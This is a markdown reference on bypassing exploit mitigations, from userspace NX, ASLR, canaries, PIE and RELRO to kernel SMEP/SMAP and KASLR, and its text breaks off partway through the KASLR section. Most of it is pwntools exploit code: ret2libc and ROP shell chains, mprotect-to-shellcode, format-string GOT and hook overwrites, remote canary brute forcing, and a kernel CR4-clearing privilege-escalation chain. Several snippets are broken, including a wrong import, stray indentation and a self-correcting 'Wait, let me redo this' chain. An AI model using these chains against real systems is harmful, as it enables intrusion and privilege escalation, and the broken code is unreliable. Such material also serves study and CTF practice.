# Security Mitigation Bypass Techniques — Userspace & Kernel

> The definitive reference on bypassing modern security mitigations, from classic ret2libc to kernel-level SMEP/SMAP and seccomp escapes.

---

## Table of Contents

1. [NX/DEP Bypass](#1-nxdep-bypass)
2. [ASLR Bypass](#2-aslr-bypass)
3. [Stack Canary Bypass](#3-stack-canary-bypass)
4. [PIE Bypass](#4-pie-bypass)
5. [RELRO Bypass](#5-relro-bypass)
6. [Modern Kernel Protections Bypass](#6-modern-kernel-protections-bypass)
7. [Sandbox & Seccomp Bypass](#7-sandbox--seccomp-bypass)

---

## 1. NX/DEP Bypass

### What NX/DEP Prevents

NX (No-eXecute) / DEP (Data Execution Prevention) marks memory pages containing data (stack, heap, .bss) as non-executable. When the CPU attempts to fetch and execute instructions from an NX-marked page, a fault is raised (`SIGSEGV` on Linux, `STATUS_ACCESS_VIOLATION` on Windows). This stops the classic technique of injecting shellcode onto the stack and jumping to it.

**How it works internally:** The kernel sets the XD (eXecute Disable) bit in page-table entries for data pages. On x86-64, this is bit 63 of the PTE. The CPU's MMU enforces this at translation time — no software intervention is needed at runtime.

### 1.1 Return-to-libc (ret2libc)

Instead of executing shellcode, return to an existing function in libc (or any loaded library) whose code *is* on an executable page.

**Classic ret2libc for a 32-bit binary:**

```c
// Vulnerable program
#include <string.h>
void vuln() {
    char buf[64];
    gets(buf); // stack overflow
}
int main() { vuln(); }
```

```python
# exploit.py — ret2libc on 32-bit, no ASLR
from pwn import *

elf = ELF('./vuln')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

p = process('./vuln')

# Offset to return address
offset = 64 + 8  # buf + saved EBP

payload  = b'A' * offset
payload += p32(libc.symbols['system'])   # return to system()
payload += p32(0xdeadbeef)               # fake return address for system()
payload += p32(next(libc.search(b'/bin/sh')))

p.sendline(payload)
p.interactive()
```

The stack becomes: `[padding][system@libc][exit@libc]["/bin/sh"@libc]`. When `vuln` returns, `system("/bin/sh")` executes. No code on the stack is ever executed — only data is placed there, and execution comes from libc's `.text`.

**64-bit ret2libc** requires setting `rdi` (first argument) before calling `system()`:

```python
# 64-bit ret2libc — need a "pop rdi; ret" gadget
pop_rdi = 0x0000000000023b65  # offset in libc
ret     = 0x0000000000082278  # needed for stack alignment

bin_sh  = next(libc.search(b'/bin/sh'))
system  = libc.symbols['system']

payload  = b'A' * offset
payload += p64(ret)             # align stack (16-byte)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
```

### 1.2 ROP Chains (Return-Oriented Programming)

ROP generalizes ret2libc: instead of calling complete functions, chain short instruction sequences ("gadgets") ending in `ret`. Each gadget "returns" to the next, building a Turing-complete execution fabric from existing code.

**Gadget hunting:**

```bash
# Find gadgets in a binary
ROPgadget --binary ./vuln

# In libc (useful after ASLR bypass)
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi"

# Ropper — another gadget finder
ropper --file ./vuln --search "pop rdi"

# One-liner to generate a full ROP chain
ROPgadget --binary ./vuln --ropchain
```

**Manual gadget discovery from disassembly:**

```bash
objdump -d ./vuln | grep -B1 'ret$' | head -30
```

Some useful gadgets look like this in x86-64:

```asm
; Gadget 1: set rdi
pop rdi
ret

; Gadget 2: set rsi and r15
pop rsi
pop r15
ret

; Gadget 3: set rdx (harder to find)
pop rdx
ret

; Gadget 4: syscall
syscall
ret

; Gadget 5: write-what-where
mov [rax], rdx
ret
```

**Building a full execve ROP chain (x86-64):**

```python
from pwn import *

elf  = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Gadgets (offsets within libc — add libc base after leak)
POP_RDI  = 0x0000000000023b6a
POP_RSI  = 0x000000000002601f
POP_RDX  = 0x0000000000124b22   # rdx; pop rbx; ret variant may differ
SYSCALL  = 0x00000000000d2975

EXECVE   = libc.symbols['execve']  # or use syscall number 59 directly

# Strategy: execve("/bin/sh", NULL, NULL)
# Need: rdi = ptr to "/bin/sh", rsi = 0, rdx = 0, rax = 59, syscall

def build_rop(libc_base):
    bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))

    payload  = p64(libc_base + POP_RDI)
    payload += p64(bin_sh)
    payload += p64(libc_base + POP_RSI)
    payload += p64(0)         # argv = NULL
    payload += p64(libc_base + POP_RDX)
    payload += p64(0)         # envp = NULL

    # Set rax = 59 (SYS_execve) — need a "pop rax; ret" gadget
    POP_RAX  = 0x0000000000036174
    payload += p64(libc_base + POP_RAX)
    payload += p64(59)

    payload += p64(libc_base + SYSCALL)
    return payload
```

### 1.3 mprotect() Trick (Making Stack Executable)

If you have enough control and know the stack address, call `mprotect()` to re-mark the stack page as RWX, then jump to shellcode placed on the stack.

```python
from pwn import *

p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Leak libc base somehow (see ASLR bypass section)
libc_base = leaked_libc_addr - libc.symbols['puts']

mprotect = libc_base + libc.symbols['mprotect']
POP_RDI  = libc_base + 0x23b6a
POP_RSI  = libc_base + 0x2601f
POP_RDX  = libc_base + 0x124b22

# Align stack address to page boundary (must be page-aligned for mprotect)
stack_page = leaked_stack_addr & ~0xfff

# Shellcode (reverse shell, etc.)
shellcode = asm(shellcraft.amd64.linux.sh())

payload  = b'A' * offset

# Call mprotect(stack_page, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC)
payload += p64(POP_RDI) + p64(stack_page)     # addr
payload += p64(POP_RSI) + p64(0x1000)          # len
payload += p64(POP_RDX) + p64(7)               # PROT_READ|PROT_WRITE|PROT_EXEC = 7

# Need a "call mprotect" or just return into PLT if available
# If PLT exists:
payload += p64(elf.plt['mprotect'])

# After mprotect returns, jump to shellcode on stack
# Need a gadget to jump to rsp or rsp+offset
JMP_RSP = 0x00000000000bbcbe  # jmp rsp; from libc or binary
payload += p64(libc_base + JMP_RSP)
payload += shellcode

p.sendline(payload)
p.interactive()
```

**Why this works:** `mprotect()` is a legitimate libc call that changes page permissions. The kernel honors the request if the address is page-aligned and the process has the right to change protections (it's its own stack). After `mprotect` returns, you land on a `jmp rsp` gadget which redirects execution into the now-executable shellcode.

### 1.4 ret2plt / ret2got

When you haven't leaked libc yet, you can call functions through the PLT (Procedure Linkage Table). The PLT stubs are at known addresses (non-PIE) or can be calculated (after PIE bypass).

```python
from pwn import *

p = process('./vuln')
elf = ELF('./vuln')

# ret2plt: call puts@plt to leak a GOT entry
# Layout: [padding][puts@plt][main][puts@got]

payload  = b'A' * offset
payload += p64(elf.plt['puts'])    # call puts()
payload += p64(elf.symbols['main']) # return to main for second pass
payload += p64(elf.got['puts'])    # argument: GOT entry of puts (leaks libc addr)

p.sendline(payload)

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = leak - libc.symbols['puts']
```

**ret2got** is similar but targets the GOT directly — you overwrite a GOT entry to redirect a future function call.

### 1.5 One-Gadget in libc

One-gadgets are single addresses in libc that, when returned to, directly `execve("/bin/sh", ...)` with constraints on register values. They avoid building multi-gadget ROP chains.

```bash
# Find one-gadgets
one_gadget /lib/x86_64-linux-gnu/libc.so.6
```

Typical output:
```
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rax == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

```python
from pwn import *

# After leaking libc base:
libc_base = leak - libc.symbols['puts']

# Pick a one-gadget whose constraints are satisfied
one_gadget = libc_base + 0x4f2c5

payload  = b'A' * offset
payload += p64(one_gadget)
```

The constraint check is critical — if the one-gadget requires `[rsp+0x70] == NULL`, your padding must ensure there's a NULL at that offset on the stack, or you need a different gadget.

---

## 2. ASLR Bypass

### What ASLR Prevents

ASLR (Address Space Layout Randomization) randomizes the base addresses of the stack, heap, shared libraries, and (with PIE) the executable itself at each process load. This means the attacker cannot predict where `system()`, `/bin/sh`, or ROP gadgets live, making hardcoded addresses unreliable.

**How it works internally:** The ELF loader (`ld-linux.so`) uses the `mmap()` system call with randomized hint addresses. The kernel applies entropy (typically 28 bits on 64-bit Linux, 8 bits on 32-bit) via `randomize_va_space` (`/proc/sys/kernel/randomize_va_space`). On 32-bit, the entropy is low enough to brute-force.

### 2.1 Information Leaks (Format String, Info Leak Primitives)

The most reliable ASLR bypass: leak a pointer from the stack or GOT that reveals a library address.

**Format string leak:**

```c
// Vulnerable: printf(user_controlled_string)
void vuln(char *input) {
    printf(input); // format string vulnerability
}
```

```python
# Leak stack values — on 64-bit, first 6 args in registers, then on stack
# Try offsets 6, 7, 8... until you find a libc-looking address

for i in range(1, 40):
    p = process('./vuln')
    p.sendline(f'%{i}$p'.encode())
    result = p.recvline()
    print(f"Offset {i}: {result}")
    p.close()

# Once you find a libc address at, say, offset 11:
p = process('./vuln')
p.sendline(b'%11$p')
leak = int(p.recvline().strip(), 16)
libc_base = leak - (libc.symbols['__libc_start_main'] + 0xf1)  # offset depends on version
```

**GOT leak via ROP (see ret2plt in Section 1.4):**

```python
# Leak puts@GOT to get libc address
payload  = b'A' * offset
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])   # loop back for second stage

p.sendline(payload)
```

**Partial read primitives:** If you can read memory through an arbitrary read (e.g., via a linked list traversal bug), read the GOT to resolve libc.

### 2.2 Partial Overwrite (Using Low 12 Bits)

ASLR randomizes the high bits but the low 12 bits (one page) remain constant because page-offset bits are not randomized. If you can partially overwrite a pointer, you only need to guess the randomized high bits.

```python
# Example: you know puts is at libc_base + 0x80ed0
# The low 12 bits (0xed0) are always the same regardless of ASLR
# If you overwrite only the low 2 bytes of a return address,
# you only need to brute-force the remaining bits

# On 32-bit Linux (8-bit ASLR entropy = 256 possible base addresses):
# Overwrite only the low 2-3 bytes, brute-force the rest

import struct

target_low_12 = 0xed0  # known offset within page
target_low_16 = 0x0ed0  # known offset within 64K

# Partial overwrite of 2 bytes (16 bits):
# 4 bits of entropy remain (the top nibble of the 2nd byte)
# Brute force: 16 possibilities

for attempt in range(16):
    p = process('./vuln')
    # Overwrite 2 bytes: the low 12 known bits + 4 unknown bits
    guess = (attempt << 12) | target_low_12
    payload  = b'A' * offset
    payload += p16(guess)  # only overwrite 2 bytes, leaving high bytes intact
    p.sendline(payload)
    # Check if we got a shell
```

This is especially effective against 32-bit targets where the randomization entropy is only 8 bits (256 possibilities) — trivially brute-forceable.

### 2.3 Relative Addressing

If you know the relative offset between two symbols in the same library, you only need to leak one address to compute the other:

```python
# Leak puts address via GOT
leaked_puts = u64(p.recv(6).ljust(8, b'\x00'))

# Compute libc base
libc_base = leaked_puts - libc.symbols['puts']

# Now compute any other libc symbol
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
one_gadget  = libc_base + 0x4f2c5
```

Even with full ASLR, relative offsets within a library are constant. The entire exploitation strategy is: **leak one address → compute everything else.**

### 2.4 Brute Force (32-bit ASLR)

On 32-bit Linux, the stack has only 8 bits of ASLR entropy (256 possible locations). Library mappings have 8 bits. This makes brute-forcing feasible:

```python
from pwn import *

# 32-bit: ~1/256 chance per attempt
# Expected attempts: ~256 (takes seconds over network, minutes locally)

for attempt in range(512):
    p = process('./vuln')
    payload  = b'A' * offset
    payload += p32(0x08048490)  # guessed address
    p.sendline(payload)

    try:
        p.recv(timeout=1)
        log.success(f"Hit on attempt {attempt}!")
        p.interactive()
        break
    except:
        p.close()
```

**On 64-bit:** Brute force is impractical (28+ bits of entropy → ~268M attempts). You MUST use an info leak.

### 2.5 Ret2esp / Ret2reg

When you don't know where the buffer is (ASLR), but you know execution will end up on the stack, redirect through a register that points to your buffer.

**Ret2esp (32-bit):**

```asm
; jmp esp redirects execution to wherever esp points (your buffer)
0x0806efef: jmp esp
```

```python
# Even with ASLR, if we return to "jmp esp", execution continues
# on the stack at the current ESP — which points to our shellcode
jmp_esp = 0x0806efef

payload  = b'A' * offset
payload += p32(jmp_esp)
payload += shellcode  # goes right after return address
```

**Ret2reg (64-bit):** Find a gadget that jumps through a register that happens to hold a pointer to your buffer:

```bash
ROPgadget --binary ./vuln | grep "jmp r"
# Results might include:
# 0x00013c3a: jmp rsp
# 0x00028a71: jmp rax
# 0x00039c04: jmp rdx
```

```python
# After a function like read() returns, rax might hold
# the number of bytes read or the buffer address
# Use: "call rax" or "jmp rax" gadget
jmp_rax = 0x00028a71

payload  = b'A' * offset
payload += p64(jmp_rax)
payload += shellcode
```

### 2.6 ret2dlresolve

This is a powerful technique that forges a fake `Elf64_Rela` and `Elf64_Sym` structure to trick the dynamic linker into resolving a function of your choice — without needing a libc leak.

```python
from pwntools import *

p = process('./vuln')
elf = ELF('./vuln')

# pwntools has a built-in ret2dlresolve helper
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

rop = ROP(elf)
rop.read(0, dlresolve.data_addr)  # read fake structures onto memory
rop.ret2dlresolve(dlresolve)

payload  = b'A' * offset
payload += rop.chain()

p.sendline(payload)
p.sendline(dlresolve.payload)   # send the forged structures
p.interactive()
```

**How it works internally:** The dynamic linker resolves unresolved symbols by walking the `.rela.plt` and `.dynsym` tables. By crafting a fake `Rela` entry that points to a fake `Sym` entry with the name `system`, we trick `_dl_runtime_resolve` into calling `system("/bin/sh")` for us. This works because the linker reads data from the link map — and if we can write to the right addresses, we control that data.

### 2.7 Creating Oracles

An oracle is a side channel that reveals information bit-by-bit. Common oracles:

- **Crash/no-crash oracle:** Flip one bit in a guessed address. If the program doesn't crash, the bit was correct.
- **Timing oracle:** Measure response time differences.
- **Output oracle:** Use format string `%s` to read bytes at guessed addresses.

```python
# Binary search for a byte using crash oracle
def leak_byte(addr):
    for byte_val in range(256):
        p = process('./vuln')
        # Construct a payload that returns to addr + byte_val
        # If process doesn't crash, that byte is correct
        test_addr = known_base + byte_val
        payload  = b'A' * offset
        payload += p32(test_addr)
        p.sendline(payload)
        if p.recv(timeout=0.5):
            p.close()
            return byte_val
        p.close()
```

---

## 3. Stack Canary Bypass

### What Stack Canaries Prevent

A stack canary (or stack cookie) is a random value placed between local variables and the saved return address. Before a function returns, the canary is checked against a master copy; if they differ, `__stack_chk_fail` is called, aborting the program. This prevents linear buffer overflows from overwriting the return address without also overwriting the canary.

**How it works internally:** On function entry, `fs:0x28` (x86-64 TLS) or `gs:0x14` (x86 TLS) is read and stored on the stack. On exit, it's XORed with the TLS value. The canary is initialized from `/dev/urandom` at thread creation. Crucially, the LSB of the canary on x86 is always `0x00` (null byte), which prevents string-based overflows (`strcpy`, `strcat`) from trivially overwriting it.

### 3.1 Info Leak to Disclose Canary

If you can read the canary from the stack, you can include it in your overflow payload.

**Format string leak:**

```c
// printf(user_buf) — format string vuln
void vuln() {
    char buf[64];
    gets(buf);
    printf(buf); // canary is at buf+64 on the stack
}
```

```python
# On 64-bit, canary is at a known offset from the buffer
# The canary is typically at an offset that corresponds to the %p position

# Brute-force the offset:
for i in range(1, 50):
    p = process('./vuln')
    p.sendline(f'%{i}$p'.encode())
    result = p.recvline()
    # Look for a value ending in 00 (LSB of canary is null)
    print(f"Offset {i}: {result}")
    p.close()

# Once found (e.g., offset 13):
p = process('./vuln')
p.sendline(b'%13$p')
canary = int(p.recvline().strip(), 16)
log.info(f"Canary: {hex(canary)}")

# Now include the canary in the overflow:
payload  = b'A' * 64
payload += p64(canary)     # correct canary value
payload += b'B' * 8        # saved RBP
payload += p64(pop_rdi)     # return address — ROP starts here
# ... rest of ROP chain
```

**Arbitrary read primitive:** If you have an OOB read, read `fs:0x28` indirectly by reading the canary off the stack in a parent function's frame.

### 3.2 Brute Force Byte-by-Byte (Fork-Based Servers)

Server Daemons that `fork()` on each connection inherit the parent's canary. The canary doesn't change across forked children — so we can brute-force it one byte at a time. If the byte is wrong, the child crashes (no harm — parent forks a new child). If correct, we see the expected behavior.

```python
from pwn import *

canary = b'\x00'  # LSB is always null byte on Linux

# Brute force each of the remaining 7 bytes
for byte_index in range(7):
    for guess in range(256):
        p = remote('target', 9999)

        payload  = b'A' * 64
        payload += canary + bytes([guess])

        p.sendline(payload)
        response = p.recvall(timeout=1)

        if b'stack smashing detected' not in response:
            # Correct byte — child didn't crash on canary check
            canary += bytes([guess])
            log.info(f"Byte {byte_index}: {hex(guess)} -> canary so far: {canary.hex()}")
            p.close()
            break
        p.close()

log.success(f"Full canary: {canary.hex()}")
# canary is now 8 bytes, e.g., \x00\x4a\x8b\xc2\xd1\xef\x37\x19
```

**Time cost:** 7 bytes × 256 guesses = 1792 connections worst case, 7 × 128 = 896 average. This takes seconds over localhost, minutes over network.

### 3.3 Overwriting the GOT Instead of Return Address

If you can't bypass the canary on the stack, don't touch the stack's return address at all. Instead, use a write primitive (format string `%n`, arbitrary write, etc.) to overwrite a GOT entry.

```python
# Format string: overwrite printf@got with system
# printf(user_input) becomes system(user_input)

from pwn import *

p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# If no ASLR or after leaking libc base:
printf_got = elf.got['printf']
system_addr = libc_base + libc.symbols['system']

# Write system address to printf@GOT using format string
# This requires a 64-bit write, which we split into two 32-bit writes
# (since %n only writes 4 bytes at a time on 64-bit)

# Simplified example with pwntools fmtstr:
 payload = fmtstr_payload(offset, {printf_got: system_addr})
 p.sendline(payload)

# Now when the program calls printf(user_buf), it actually calls system(user_buf)
 p.sendline(b'/bin/sh')
```

**Key insight:** The canary protects the return address on the stack, but it does NOT protect the GOT, BSS, or other writable data. If you can hijack control flow through a function pointer rather than a return address, the canary is irrelevant.

### 3.4 Exception Handler Abuse

C++ programs and some C programs use exception handling (e.g., `__cxa_throw`). Exception objects contain vtable pointers. If you can overwrite a vtable pointer or an exception handler function pointer, you redirect execution when an exception is thrown — completely bypassing the canary.

```python
# Overwrite __cxa_throw's vtable or __eh_frame data
# to point to a controllable gadget

# Step 1: Find writable function pointers in exception handling structures
# objdump -d ./vuln | grep __cxa_throw
# Step 2: Overwrite the function pointer with system or one_gadget

payload = fmtstr_payload(offset, {
    exception_handler_ptr: one_gadget_addr
})
```

Another variant: overwrite `__stack_chk_fail@GOT` itself. When the canary check fails, it calls `__stack_chk_fail`. If you've overwritten that GOT entry with `system` or a one-gadget, the very act of failing the canary check gives you a shell:

```python
# Overwrite __stack_chk_fail@GOT with one_gadget
payload = fmtstr_payload(offset, {
    elf.got['__stack_chk_fail']: libc_base + 0x4f2c5
})

# Now just overflow the canary on purpose —
# when __stack_chk_fail is called, it jumps to our one_gadget
p.sendline(b'A' * 200)
```

This is elegant: the mitigation itself becomes the vector.

---

## 4. PIE Bypass

### What PIE Prevents

PIE (Position-Independent Executable) randomizes the base address of the main executable itself, not just libraries. Without PIE, the executable's `.text`, `.plt`, `.got`, etc. are at fixed addresses known from the binary. With PIE, those addresses are randomized at load time.

**How it works internally:** The ELF is compiled as ET_DYN (shared object type). The kernel's ELF loader (`load_elf_binary`) picks a random base using `arch_randomize_brk()` or `mmap()` with `MAP_RANDOMIZED`. The total entropy on 64-bit Linux is typically 28 bits.

### 4.1 Info Leak of Code Addresses

The most common PIE bypass: leak any address from the executable's address space (from the stack, from a format string, from a partial read), then compute the base.

```python
# Program leaks a stack address (which has a saved return address
# pointing into the PIE binary)
p = process('./vuln')
p.sendline(b'%7$p')  # format string: leak stack value

leak = int(p.recvline().strip(), 16)
# leak might be, e.g., 0x55a1c2e00690 (a .text address)

# Compute PIE base:
# Check in GDB where the binary is loaded:
#   info file  or  readelf -h ./vuln
# Suppose main() is at offset 0x690 in the binary
pie_base = leak - 0x690

# Now all addresses are known:
system_plt = pie_base + elf.plt['system']
main_addr  = pie_base + elf.symbols['main']
```

**Partial overwrite variation:** If you can overwrite the low bytes of a saved return address, you can redirect execution to a nearby location without knowing the PIE base. The low 12 bits (one page) are constant.

```python
# Saved return address: 0x????0a5f
# You want to change it to: 0x????0690 (main)
# Only need to overwrite the low 2 bytes
# 0x0690 appears in the low bits regardless of PIE base

payload  = b'A' * offset
payload += p16(0x0690)  # partial overwrite, 2 bytes
# The high bytes of the return address remain unchanged
```

### 4.2 ret2csu

The `__libc_csu_init` function (present in most x86-64 ELF binaries compiled with older glibc) contains a standardized pair of gadgets that allow you to control `r12-r15`, `rbx`, `rbp`, and ultimately `r8-r11`, `rdi`, `rsi`, `rdx` — enough to call any function with up to 3 arguments.

```asm
; Gadget 1 (at end of __libc_csu_init):
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret

; Gadget 2 (slightly earlier):
mov rdx, r14
mov rsi, r13
mov edi, r12d
call QWORD PTR [r15+rbx*8]
```

```python
from pwn import *

elf = ELF('./vuln')

# These gadgets are at fixed offsets within the PIE binary
# Find them:
csu_gadget1 = elf.symbols['__libc_csu_init'] + XX  # pop rbx...pop r15; ret
csu_gadget2 = elf.symbols['__libc_csu_init'] + YY  # mov rdx, r14...call [r15+rbx*8]

# After PIE bypass (leak base):
base = leaked_address - offset_in_binary

write_target = base + elf.got['write']  # or any GOT entry we control
function_addr = base + elf.plt['write']  # function to call

payload  = b'A' * offset
payload += p64(base + csu_gadget2)  # jump to gadget 2 first

# Set up registers for gadget 2:
# r12 -> rdi (first arg), r13 -> rsi, r14 -> rdx, r15 -> function pointer
payload += p64(base + csu_gadget1)  # return address after call -> gadget 1

# Gadget 2's "call [r15 + rbx*8]" will jump to write@PLT
# After write returns, we land at gadget 1's pop sequence
payload += p64(0)     # rbx = 0 (so call reads [r15 + 0])
payload += p64(1)     # rbp = 1  (exit loop condition)
payload += p64(function_addr)  # r12 = function to call, but actually ...
# Wait, let me redo this properly:

# Full ret2csu chain:
payload  = b'A' * offset

# First, we arrive at gadget 2 (mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8])
# Before gadget 2, we need r12-r15, rbx, rbp set up
# So we return to gadget 1 first to pop those registers

payload += p64(base + csu_gadget1)  # pop rbx, rbp, r12, r13, r14, r15
payload += p64(0)             # rbx = 0
payload += p64(1)             # rbp (doesn't matter much)
payload += p64(1)             # r12 -> edi (first arg, e.g., fd=1 for write)
payload += p64(leak_addr)     # r13 -> rsi (second arg, e.g., addr to leak)
payload += p64(0x10)          # r14 -> rdx (third arg, e.g., bytes to write)
payload += p64(base + elf.got['write'])  # r15 -> call [r15+0], i.e., call write@GOT

# After write() returns, we land after the "call" instruction in gadget 2
# Then gadget 2 has more pops before its ret:
# add rsp, 8 (we need padding here)
# pop rbx, pop rbp, etc.
payload += p64(0) * 7  # padding for add rsp, 8 + 6 pops

# Then we execute gadget 1's ret again — our next payload
payload += p64(base + elf.symbols['main'])  # loop back to main
```

The beauty of ret2csu: these gadgets exist at **predictable offsets** within the PIE binary itself — no libc needed.

---

## 5. RELRO Bypass

### What RELRO Prevents

RELRO (RELocation Read-Only) protects the GOT and other relocation tables from being overwritten. There are two levels:

- **Partial RELRO:** The `.got` section (excluding `.got.plt`) is read-only. The `.got.plt` section (used for lazy binding) remains writable. This is the default for most Linux distributions.
- **Full RELRO:** The entire GOT (including `.got.plt`) is made read-only at program startup. All symbols are resolved eagerly (no lazy binding). The `mprotect()` call re-marks the GOT pages as read-only after resolution.

**How it works internally:** The linker (`ld.so`) marks RELRO-protected pages with `PT_GNU_RELRO` in the ELF program headers. After relocation, `mprotect()` is called to set these pages to `PROT_READ`. An attacker cannot `write()` to them — any attempt causes a segfault.

### 5.1 Partial RELRO: Overwrite `.got.plt`

When only partial RELRO is enabled, `.got.plt` entries are writable. These are the function pointers used for lazy binding (added by `ld.so` on first call).

```python
# Partial RELRO: printf@got.plt is writable
from pwn import *

p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Using format string to overwrite printf@GOT with system:
printf_got = elf.got['printf']  # in .got.plt, writable

# *OR* using an arbitrary write primitive
payload = arbitrary_write(printf_got, libc_base + libc.symbols['system'])

# Now printf(user_buf) → system(user_buf)
p.sendline(b'/bin/sh')
```

**Even with partial RELRO, format string `%n` writes to `.got.plt` work perfectly.** The constraint is only that `.got` (non-PLT entries) is read-only.

### 5.2 Full RELRO: Alternative Strategies

With full RELRO, you cannot overwrite any GOT entry. The GOT is `PROT_READ`. Strategies shift:

**Strategy 1: Target other writable function pointers**

Look for function pointers in writable memory — vtables, callback pointers, `__malloc_hook`, `__free_hook` (deprecated in newer glibc but present in older versions):

```python
# glibc < 2.34: __malloc_hook and __free_hook are writable
malloc_hook = libc_base + libc.symbols['__malloc_hook']
free_hook   = libc_base + libc.symbols['__free_hook']

# Overwrite __malloc_hook with one_gadget:
payload = arbitrary_write(malloc_hook, one_gadget_addr)

# Next malloc() call triggers the hook → shell
p.sendline(b'anything that triggers malloc')
```

**Strategy 2: Target C++ vtables**

If the binary uses C++ classes with virtual functions, vtable pointers are on the heap or stack and writable:

```python
# Overwrite a vtable pointer to point to a fake vtable
# whose first entry is a one_gadget or system address

# 1. Find the object's vtable pointer on the heap
# 2. Allocate a fake vtable in a controllable region
# 3. Set fake_vtable[0] = system or one_gadget
# 4. Overwrite the object's vtable pointer to point to fake_vtable

fake_vtable_addr = heap_addr + 0x100  # in controllable memory
payload  = arbitrary_write(fake_vtable_addr, one_gadget_addr)  # vtable[0]
payload += arbitrary_write(object_vtable_ptr, fake_vtable_addr)  # point object to fake vtable

# When the virtual method is called, it reads vtable[0] = one_gadget
```

**Strategy 3: Overwrite `__exit_funcs` or `__atexit` handlers**

```python
# The __exit_funcs list contains function pointers called on exit()
# These are in writable memory (BSS/mapped area)
exit_funcs = libc_base + libc.symbols['__exit_funcs']

# Overwrite a function pointer in the exit handler list
payload = arbitrary_write(exit_funcs + OFFSET, one_gadget_addr)

# Trigger exit() to execute our overwritten handler
p.sendline(b'trigger exit')
```

**Strategy 4: Overwrite `.fini_array`**

The `.fini_array` section contains function pointers called when the program exits. If it's writable (which it sometimes is even with full RELRO):

```bash
readelf -S ./vuln | grep fini_array
# If it's in a writable segment, we can target it
```

```python
fini_array = elf.symbols['__dtor_list__']  # or .fini_array address
# This is in the data segment — might be writable even with full RELRO
payload = arbitrary_write(fini_array, one_gadget_addr)
```

---

## 6. Modern Kernel Protections Bypass

### 6.1 SMEP/SMAP Bypass

**SMEP** (Supervisor Mode Execution Prevention) prevents the kernel from executing code in user-space pages. When the CPU is in ring 0 (kernel mode) and tries to fetch an instruction from a user-space page, a fault is generated.

**SMAP** (Supervisor Mode Access Prevention) extends this to data access — the kernel cannot read/write user-space memory from ring 0 unless `RFLAGS.AC` is set (via `stac`/`clac` instructions) or the access uses `copy_to_user`/`copy_from_user`.

**How they work:** Both are controlled by bits in CR4: SMEP = bit 20, SMAP = bit 21. Set during boot by the kernel and enforced by the CPU.

**Bypass 1: ROP to `native_write_cr4`**

```python
# Goal: clear SMEP and SMAP bits in CR4
# CR4 value with SMEP+SMAP: 0x00000000001406f0 (bit 20 and 21 set)
# CR4 value without:        0x00000000000006f0 (bits 20,21 cleared)

# Build a kernel ROP chain to call native_write_cr4(0x00000000000006f0)
# This disables SMEP and SMAP, allowing ret2user

from pwn import *

# Kernel ROP gadgets (from vmlinux)
# pop rdi; ret
pop_rdi = kernel_base + 0xXXXXXX
native_write_cr4 = kernel_base + 0xYYYYYY
commit_creds     = kernel_base + symbols['commit_creds']
prepare_kernel_cred = kernel_base + symbols['prepare_kernel_cred']
swapgs_restore_regs_and_return_to_usermode = kernel_base + 0xZZZZZZ

# Payload on user-space stack (triggered via kernel overflow)
def build_kernel_rop(kernel_base):
    payload  = p64(pop_rdi)
    payload += p64(0x00000000000006f0)  # new CR4 value (no SMEP/SMAP)
    payload += p64(native_write_cr4)
    payload += p64(pop_rdi)
    payload += p64(0)  # prepare_kernel_cred(0) = init cred
    payload += p64(prepare_kernel_cred)
    payload += p64(pop_rdi)
    # rdi = return value of prepare_kernel_cred (new cred)
    # ... need a "mov rdi, rax; ..." gadget or use a different approach

    # Alternative: use commit_creds(prepare_kernel_cred(0))
    # with a "push rax; pop rdi; ret" or similar gadget

    # After privilege escalation, return to usermode:
    payload += p64(swapgs_restore_regs_and_return_to_usermode)
    # Arguments for iretq frame:
    payload += p64(0)     # padding (rcx)
    payload += p64(0)     # r11 (RFLAGS)
    payload += p64(user_cs)  # CS
    payload += p64(user_rsp)  # RSP
    payload += p64(user_ss)  # SS
    return payload
```

**Bypass 2: KPTI trampoline (see Section 6.3)** — avoids disabling SMEP/SMAP entirely by using a proper return-to-usermode path.

**Bypass 3: Direct ret2user without SMEP** (on systems without SMEP, or after disabling it):

```c
// User-space payload function
void escalate_privileges() {
    commit_creds(prepare_kernel_cred(0));
}

// If kernel overflow jumps to this user-space function, it runs in ring 0
// With SMEP, this crashes. Without SMEP (or after disabling it), it works.
```

### 6.2 KASLR Bypass

**KASLR** (Kernel Address Space Layout Randomization) randomizes the kernel base address at boot. On x86-64, the entropy is about 30 bits (positions aligned to 2MB).

**Bypass 1: /proc/kallsyms and /proc/modules leak**

```bash
# If /proc/kallsyms is readable by unprivileged users:
cat /proc/kallsyms | head -5
# ffffffffb4200000 T _text
# ffffffffb4201000 T startup_64
# ...

# If not readable directly, use an info leak primitive in the kernel exploit
```

```c
// Kernel exploit: leak kernel address from an uninitialized struct
// or a kernel pointer left in user-accessible memory

// Bypass via /proc/kallsyms (older kernels or misconfigured systems):
unsigned long get_kernel_base() {
    FILE *f = fopen("/proc/kallsyms", "r");
    char line[256];
    unsigned long addr;
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, " _text") || strstr(line, " startup_64")) {
            sscanf(line, "%lx", &addr);
            fclose(f);
            return addr;
        }
    }
    fclose(f);
    return 0;
}
```

**Bypass 2: Kernel info leak primitives**

